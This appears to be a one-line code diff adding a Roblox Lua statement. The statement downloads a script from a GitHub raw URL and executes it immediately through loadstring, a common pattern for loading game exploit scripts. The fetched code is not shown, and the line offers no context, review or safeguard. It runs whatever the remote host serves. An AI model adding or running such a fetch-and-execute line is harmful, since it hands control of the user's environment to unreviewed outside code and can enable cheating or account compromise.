@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/almondtor123/rolox/main/script.lua"))()
